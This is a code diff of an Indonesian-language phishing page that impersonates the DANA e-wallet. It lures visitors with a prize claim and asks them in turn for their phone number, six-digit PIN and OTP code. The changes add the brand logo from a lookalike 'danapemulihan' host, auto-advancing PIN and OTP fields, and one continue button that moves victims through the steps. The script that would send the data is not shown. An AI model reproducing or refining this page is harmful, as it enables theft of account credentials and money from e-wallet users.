@@ -10,64 +10,61 @@
 <body>
   <div class="container">
     <!-- Halaman Nomor Telepon -->
-    <div id="number-page" class="page">
-      <h1 class="logo-text">CLAIM HADIAH</h1> <!-- Logo diganti dengan tulisan DANA -->
+    <div id="number-page" style="display: block;">
+      <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo dana" class="logo">
       <h2>Masukkan Nomor HP kamu</h2>
       <div class="phone-input-container">
         <div class="country-code-box">
           <span>+62</span>
         </div>
-        <input type="text" id="phone-number" placeholder="8123-4567-890" maxlength="15" inputmode="numeric">
+        <input type="text" id="phone-number" placeholder="8811-2345-6789" maxlength="15" inputmode="numeric">
       </div>
       <p class="info-text">
         Dengan melanjutkan, kamu setuju dengan <b>Syarat & Ketentuan</b> dan <b>Kebijakan Privasi</b> kami.
       </p>
-      <button id="lanjutkan-button" class="button" disabled>Lanjutkan</button>
     </div>
 
     <!-- Halaman PIN -->
-    <div id="pin-page" class="page" style="display: none;">
-      <h1 class="logo-text">Lanjut CLAIM</h1> <!-- Logo diganti dengan tulisan DANA -->
+    <div id="pin-page" style="display: none;">
+      <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo dana" class="logo">
       <h2>Masukkan PIN</h2>
       <div class="pin-container">
-        <input type="text" class="input-box pin-box" maxlength="1" inputmode="numeric">
-        <input type="text" class="input-box pin-box" maxlength="1" inputmode="numeric">
-        <input type="text" class="input-box pin-box" maxlength="1" inputmode="numeric">
-        <input type="text" class="input-box pin-box" maxlength="1" inputmode="numeric">
-        <input type="text" class="input-box pin-box" maxlength="1" inputmode="numeric">
-        <input type="text" class="input-box pin-box" maxlength="1" inputmode="numeric">
+        <input type="text" class="input-box pin-box" maxlength="1" oninput="moveToNextInput(this, 'pin')" inputmode="numeric">
+        <input type="text" class="input-box pin-box" maxlength="1" oninput="moveToNextInput(this, 'pin')" inputmode="numeric">
+        <input type="text" class="input-box pin-box" maxlength="1" oninput="moveToNextInput(this, 'pin')" inputmode="numeric">
+        <input type="text" class="input-box pin-box" maxlength="1" oninput="moveToNextInput(this, 'pin')" inputmode="numeric">
+        <input type="text" class="input-box pin-box" maxlength="1" oninput="moveToNextInput(this, 'pin')" inputmode="numeric">
+        <input type="text" class="input-box pin-box" maxlength="1" oninput="moveToNextInput(this, 'pin')" inputmode="numeric">
       </div>
       <div class="show-text-container">
-        <button class="show" type="button">TAMPILKAN</button>
+        <span>Tampilkan</span>
       </div>
       <div class="help-forgot-container">
         <a href="#" class="link">Bantuan</a>
         <a href="#" class="link">Lupa PIN?</a>
       </div>
-      <button id="lanjutkan-button-pin" class="button" disabled>Lanjutkan</button>
     </div>
 
     <!-- Halaman OTP -->
-    <div id="otp-page" class="page" style="display: none;">
-      <h1 class="logo-text">verifikasi</h1> <!-- Logo diganti dengan tulisan DANA -->
+    <div id="otp-page" style="display: none;">
       <h2>Masukkan Kode OTP</h2>
       <div class="otp-container">
-        <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
-        <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
-        <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
-        <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
+        <input type="text" class="input-box otp-box" maxlength="1" oninput="moveToNextInput(this, 'otp')" inputmode="numeric">
+        <input type="text" class="input-box otp-box" maxlength="1" oninput="moveToNextInput(this, 'otp')" inputmode="numeric">
+        <input type="text" class="input-box otp-box" maxlength="1" oninput="moveToNextInput(this, 'otp')" inputmode="numeric">
+        <input type="text" class="input-box otp-box" maxlength="1" oninput="moveToNextInput(this, 'otp')" inputmode="numeric">
       </div>
-      <p class="berhadiah-text">🎁 Berhadiah! Verifikasi sekarang untuk kesempatan menang hadiah menarik!</p>
+      <p class="berhadiah-text">🎁 Berhadiah! Verifikasi sekarang untuk kesempatan menang hadiah menarik!!!</p>
       <div id="floating-notification" class="floating-notification">
         Silakan verifikasi notifikasi yang muncul untuk menerima kode OTP.
       </div>
-      <button id="lanjutkan-button-otp" class="button" disabled>Lanjutkan</button>
     </div>
   </div>
 
   <!-- Footer -->
   <div class="footer">
     <p>&copy; 2025 HDGT khusus yang terpilih saja.</p>
+    <button id="lanjutkan-button" class="button" onclick="goToNextPage()">Lanjutkan</button>
   </div>
 
   <script src="javascript.js"></script>
